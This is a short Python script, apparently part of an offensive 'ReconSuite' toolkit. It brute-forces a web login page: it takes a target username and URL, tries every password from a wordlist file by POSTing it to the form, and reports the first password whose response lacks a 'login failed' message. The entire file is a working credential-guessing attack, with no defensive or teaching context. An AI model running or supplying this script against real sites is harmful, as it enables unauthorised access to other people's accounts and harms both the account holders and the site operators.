#!/usr/bin/env python
import optparse
import time
from colorama import Fore, Back
import requests
from os import path


def get_options():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--username', dest='username', help="Target Username")
    parser.add_option('-t', '--target-address', dest='target_address', help="Target Webpage")
    (option, argument) = parser.parse_args()

    if not option.username:
        parser.error("[!] Username expected. Try --help for more info.")
    if not option.target_address:
        parser.error("[!] Target address expected. Try --help for more info.")

    return option


opt = get_options()

target = opt.target_address
data = {"username": opt.username, "password": "", "Login": "submit"}
password_file_location = path.abspath("./ReconSuitev1/tools/passwords_list.txt")
try:
    with open(password_file_location, 'r') as wordlist:
        for password in wordlist:
            data['password'] = password.strip()
            print(f'[>] Trying Username => {data["username"]} \n\t   Password => {password}')
            time.sleep(0.2)
            response = requests.post(target, data=data).content
            if b"login failed" not in response.lower():
                print()
                print(
                    f"[+] Login Success. The password is: {Fore.RED + Back.YELLOW + password + Back.RESET + Fore.WHITE}")
                exit()
    print("[!] Password not found in password list.")
except KeyboardInterrupt:
    print("\n[x] Exiting Program.")


